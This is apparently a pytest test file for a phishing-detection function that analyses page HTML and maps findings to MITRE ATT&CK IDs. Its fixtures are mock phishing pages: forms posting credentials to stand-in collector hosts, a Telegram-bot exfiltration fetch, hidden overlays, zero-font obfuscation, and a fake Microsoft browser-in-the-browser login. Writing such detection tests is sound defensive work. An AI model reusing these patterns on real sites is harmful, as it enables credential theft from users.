import pytest
from app.dom_comparator import extract_dom_deep_forensics

def test_dom_forensics_form_action_mismatch():
    html = """
    <html>
    <body>
        <form action="http://c2-collector-drop.xyz/login.php" method="POST" id="phish_form">
            <input type="email" name="user" />
            <input type="password" name="passwd" />
            <button type="submit">Sign In</button>
        </form>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://paypal-verification-account.tk/login",
        canonical_domains=["paypal.com"]
    )
    assert res.has_form_action_mismatch is True
    assert len(res.form_actions) == 1
    assert res.form_actions[0].target_domain == "c2-collector-drop.xyz"
    assert res.form_actions[0].has_password_field is True
    assert "T1056.001" in res.mitre_attack_id

def test_dom_forensics_canonical_form():
    html = """
    <html>
    <body>
        <form action="https://www.paypal.com/signin/submit" method="POST">
            <input type="password" name="password" />
        </form>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="https://www.paypal.com/signin",
        canonical_domains=["paypal.com", "www.paypal.com"]
    )
    assert res.has_form_action_mismatch is False

def test_dom_forensics_iframe_overlay():
    html = """
    <html>
    <body>
        <iframe src="http://hidden-overlay.tk" style="position: absolute; opacity: 0; z-index: 999;"></iframe>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://suspicious-overlay.tk"
    )
    assert res.has_iframe_overlay is True
    assert "T1204.001" in res.mitre_attack_id

def test_dom_forensics_suspicious_script():
    html = """
    <html>
    <head>
        <script src="http://evil-tracker-payload.tk/hook.js"></script>
    </head>
    <body>
        <h1>Login</h1>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://normal-landing.com",
        canonical_domains=["normal-landing.com"]
    )
    assert len(res.suspicious_external_scripts) >= 1


def test_dom_forensics_formless_harvesting():
    html = """
    <html>
    <body>
        <div class="custom-card">
            <h2>Enter Your Security Password</h2>
            <input type="text" id="user" placeholder="Email" />
            <input type="password" id="pass" placeholder="Password" />
            <button id="submit-btn" onclick="sendData()">Sign In</button>
        </div>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://formless-collector.xyz"
    )
    assert res.is_formless_harvesting is True
    assert res.password_input_count >= 1
    assert "T1056.004" in res.mitre_attack_id

def test_dom_forensics_zero_font_obfuscation():
    html = """
    <html>
    <body>
        <h1>G<span style="font-size: 0px;">decoyspam</span>o<span style="font-size: 0.1px;">123</span>o<span style="display:none;">xyz</span>g<span style="visibility:hidden">abc</span>le Sign In</h1>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://zero-font-attack.tk"
    )
    assert res.has_zero_font_obfuscation is True
    assert "T1027.006" in res.mitre_attack_id

def test_dom_forensics_webhook_exfiltration():
    html = """
    <html>
    <body>
        <script>
            function submitForm() {
                fetch("https://api.telegram.org/bot123456789:ABCdefGHI/sendMessage?chat_id=999&text=stolen", {method: "POST"});
            }
        </script>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://telegram-drop.tk"
    )
    assert len(res.exfiltration_endpoints) >= 1
    assert "T1020" in res.mitre_attack_id

def test_dom_forensics_shadow_dom_detection():
    html = """
    <html>
    <body>
        <login-card-component>
            <div data-shadow-root="true">
                <input type="password" name="encapsulated_pass" />
            </div>
        </login-card-component>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://shadow-dom-target.tk"
    )
    assert res.has_shadow_dom_nodes is True
    assert "T1027" in res.mitre_attack_id


def test_dom_forensics_hyperlinks_and_anchor_discrepancy():
    html = """
    <html>
    <body>
        <a href="#">Dead Link 1</a>
        <a href="javascript:void(0);">Dead Link 2</a>
        <a href="http://external-attacker.xyz/steal">https://www.paypal.com/signin</a>
        <a href="/internal/help">Help</a>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://fake-paypal-login.xyz",
        canonical_domains=["paypal.com", "www.paypal.com"]
    )
    assert res.total_hyperlinks_count == 4
    assert res.null_hyperlinks_ratio == 0.50  # 2 out of 4 are null
    assert res.anchor_text_discrepancy_count >= 1
    assert "T1566.002" in res.mitre_attack_id


def test_dom_forensics_cantina_resource_ratio():
    html = """
    <html>
    <head>
        <link rel="icon" href="https://external-cdn-spoof.com/favicon.ico" />
        <link rel="stylesheet" href="https://external-cdn-spoof.com/style.css" />
    </head>
    <body>
        <img src="https://external-cdn-spoof.com/logo.png" />
        <img src="/local/icon.png" />
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://phish-site.xyz"
    )
    assert res.external_resources_ratio >= 0.50
    assert res.favicon_external_mismatch is True


def test_dom_forensics_server_form_handler():
    html = """
    <html>
    <body>
        <form action="#" method="POST">
            <input type="password" name="pwd" />
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://fake-portal.xyz"
    )
    assert res.has_server_form_handler_mismatch is True


def test_dom_forensics_anti_analysis_and_bitb():
    html = """
    <html>
    <body oncontextmenu="return false;" onselectstart="return false;">
        <div class="browser-window">
            <div class="window-controls">
                <span class="close"></span>
            </div>
            <div class="fake-address-bar">
                https://login.microsoftonline.com/oauth2/authorize
            </div>
            <form action="http://c2-steal.xyz/post" method="POST">
                <input type="password" name="password" />
            </form>
        </div>
    </body>
    </html>
    """
    res = extract_dom_deep_forensics(
        dom_html=html,
        candidate_url="http://bitb-attack.xyz"
    )
    assert res.has_right_click_disabled is True
    assert res.has_text_selection_disabled is True
    assert res.has_browser_in_the_browser is True
    assert "T1185" in res.mitre_attack_id


